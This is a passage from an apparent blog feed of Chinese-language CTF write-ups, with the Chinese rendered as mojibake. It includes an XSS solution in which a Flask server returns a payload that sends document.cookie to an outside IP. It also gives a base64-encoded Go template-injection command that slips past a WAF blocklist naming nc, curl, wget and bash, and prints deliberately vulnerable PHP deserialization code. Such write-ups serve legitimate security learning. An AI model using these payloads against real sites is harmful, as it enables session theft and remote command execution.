src=&quot;/preview?index=$&#123;encodeURIComponent(index)&#125;&amp;content=$&#123;encodeURIComponent(content)&#125;&quot; nonce=&quot;$&#123;res.locals.nonce&#125;&quot;&gt;&lt;/script&gt;</code></p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨ vps ä¸Šèµ·ä¸€ä¸ªå¸¦æœ‰ &#x2F;preview è·¯ç”±çš„ web æœåŠ¡ï¼Œä½¿å…¶è¿”å› xss payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        location.href = 'http://192.168.1.154:23333/?c=' + document.cookie;    """</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20251007040535512.png"></p><p>æ‰€ä»¥æ•´ä¸ªæ­¥éª¤å°±æ˜¯ï¼šåˆ›å»ºä¸¤ä¸ª nodeï¼Œnode0 æ˜¯ base-uri ç»•è¿‡ CSPï¼Œnode1 è§¦å‘ &#x2F;preview å¼¹ cookie</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;ZianTT çš„ wpï¼š &lt;a href=&quot;https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA&quot;&gt;https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A5rZ çš„ wpï¼š &lt;a href=&quot;https://blog.csdn.net/weixin_59166557/article/details/151723712&quot;&gt;https://blog.csdn.net/weixin_59166557/article/details/151723712&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Sh_eePppp çš„ wpï¼š &lt;a href=&quot;https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes&quot;&gt;https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="python" scheme="http://c1oudfl0w0.github.io/blog/tags/python/"/>
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>æ¹¾åŒºæ¯2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/</id>
    <published>2025-09-08T09:34:31.000Z</published>
    <updated>2025-09-19T02:19:50.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸éš¾</p><span id="more"></span><hr><h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><p>æç¤ºæˆ‘ä»¬ <code>&#123;&#123;' enter your payload '&#125;&#125;</code></p><p>æµ‹äº†ä¸€ä¸‹åº”è¯¥ä¸æ˜¯ flaskï¼Œ404 çš„æŠ¥é”™åƒæ˜¯ nodejs æˆ–è€… go çš„ï¼Œæ£€æµ‹åˆ° eval å°±ä¸è§£æï¼Œæµ‹äº†ä¸€ä¸‹ <code>&#123;&#123;.&#125;&#125;</code> æœ‰å›æ˜¾å‘ç°æ˜¯ go çš„æ¨¡æ¿ï¼Œè¿”å›äº† <code>map[B64Decode:0x6ee380 exec:0x6ee120]</code></p><p>æµ‹äº†ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œä¹Ÿæœ‰ wafï¼Œäºæ˜¯å°è¯•è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç¼–ç å®ç°å‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>exec <span class="token punctuation">(</span>B64Decode <span class="token string">"Y2F0IC9mbGFn"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>main.go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bytes"</span><span class="token string">"encoding/base64"</span><span class="token string">"fmt"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"os/exec"</span><span class="token string">"regexp"</span><span class="token string">"runtime"</span><span class="token string">"strings"</span><span class="token string">"text/template"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>command <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> cmd <span class="token operator">*</span>exec<span class="token punctuation">.</span>Cmd<span class="token keyword">if</span> runtime<span class="token punctuation">.</span>GOOS <span class="token operator">==</span> <span class="token string">"windows"</span> <span class="token punctuation">&#123;</span>cmd <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>cmd <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> out bytes<span class="token punctuation">.</span>Buffer<span class="token keyword">var</span> stderr bytes<span class="token punctuation">.</span>Buffercmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> <span class="token operator">&amp;</span>outcmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> <span class="token operator">&amp;</span>stderrerr <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> stderr<span class="token punctuation">.</span><span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"å‘½ä»¤æ‰§è¡Œé”™è¯¯: %s"</span><span class="token punctuation">,</span> stderr<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"æ‰§è¡Œå¤±è´¥: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">b64Decode</span><span class="token punctuation">(</span>encoded <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>decodedBytes<span class="token punctuation">,</span> err <span class="token operator">:=</span> base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>decodedBytes<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">aWAF</span><span class="token punctuation">(</span>next http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler <span class="token punctuation">&#123;</span><span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">HandlerFunc</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path <span class="token operator">!=</span> <span class="token string">"/api"</span> <span class="token punctuation">&#123;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>query <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">)</span><span class="token keyword">if</span> query <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>blacklist <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">,</span> <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"uname"</span><span class="token punctuation">,</span> <span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"etc"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">,</span> <span class="token string">"\\*"</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">,</span> <span class="token string">"rm"</span><span class="token punctuation">,</span> <span class="token string">"cp"</span><span class="token punctuation">,</span> <span class="token string">"mv"</span><span class="token punctuation">,</span> <span class="token string">"chmod"</span><span class="token punctuation">,</span> <span class="token string">"chown"</span><span class="token punctuation">,</span> <span class="token string">"wget"</span><span class="token punctuation">,</span> <span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"python"</span><span class="token punctuation">,</span> <span class="token string">"perl"</span><span class="token punctuation">,</span> <span class="token string">"ruby"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"find"</span><span class="token punctuation">,</span> <span class="token string">"grep"</span><span class="token punctuation">,</span> <span class="token string">"awk"</span><span class="token punctuation">,</span> <span class="token string">"sed"</span><span class="token punctuation">,</span> <span class="token string">"tar"</span><span class="token punctuation">,</span> <span class="token string">"zip"</span><span class="token punctuation">,</span> <span class="token string">"unzip"</span><span class="token punctuation">,</span> <span class="token string">"gzip"</span><span class="token punctuation">,</span> <span class="token string">"gunzip"</span><span class="token punctuation">,</span> <span class="token string">"bzip2"</span><span class="token punctuation">,</span> <span class="token string">"bunzip2"</span><span class="token punctuation">,</span> <span class="token string">"xz"</span><span class="token punctuation">,</span> <span class="token string">"unxz"</span><span class="token punctuation">,</span> <span class="token string">"docker"</span><span class="token punctuation">,</span> <span class="token string">"kubectl"</span><span class="token punctuation">,</span> <span class="token string">"git"</span><span class="token punctuation">,</span> <span class="token string">"svn"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"\\?"</span><span class="token punctuation">,</span> <span class="token string">"&amp;&amp;"</span><span class="token punctuation">,</span> <span class="token string">"\\|"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"\\("</span><span class="token punctuation">,</span> <span class="token string">"\\)"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\^"</span><span class="token punctuation">,</span> <span class="token string">"\\$"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">&#125;</span>escaped <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> item <span class="token operator">:=</span> <span class="token keyword">range</span> blacklist <span class="token punctuation">&#123;</span>escaped<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\b"</span> <span class="token operator">+</span> item <span class="token operator">+</span> <span class="token string">"\\b"</span><span class="token punctuation">&#125;</span>wafRegex <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"(?i)%s"</span><span class="token punctuation">,</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>escaped<span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> wafRegex<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// log.Printf("æ‹¦æˆªè¯·æ±‚: %s", wafRegex.FindAllString(query, -1))</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">apiHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>query <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">)</span><span class="token keyword">if</span> query <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"éœ€è¦templateå‚æ•°"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>funcMap <span class="token operator">:=</span> template<span class="token punctuation">.</span>FuncMap<span class="token punctuation">&#123;</span><span class="token string">"exec"</span><span class="token punctuation">:</span>      execCommand<span class="token punctuation">,</span><span class="token string">"B64Decode"</span><span class="token punctuation">:</span> b64Decode<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tmpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"api"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Funcs</span><span class="token punctuation">(</span>funcMap<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusAccepted<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> buf bytes<span class="token punctuation">.</span>Buffer<span class="token keyword">if</span> err <span class="token operator">:=</span> tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> funcMap<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> query<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusAccepted<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">rootHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path <span class="token operator">!=</span> <span class="token string">"/"</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">NotFound</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>http<span class="token punctuation">.</span><span class="token function">ServeFile</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mux <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewServeMux</span><span class="token punctuation">(</span><span class="token punctuation">)</span>mux<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> rootHandler<span class="token punctuation">)</span>mux<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> apiHandler<span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"æœåŠ¡å™¨å¯åŠ¨åœ¨ :80"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">,</span> <span class="token function">aWAF</span><span class="token punctuation">(</span>mux<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="easy-readfile"><a href="#easy-readfile" class="headerlink" title="easy_readfile"></a>easy_readfile</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Coral</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$pivot</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pivot</span><span class="token operator">-></span><span class="token property">ctor</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$k</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nimbus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ctor</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Zephyr</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token operator">-></span><span class="token variable">$prop</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payload</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Acheron</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mode</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".phar"</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span 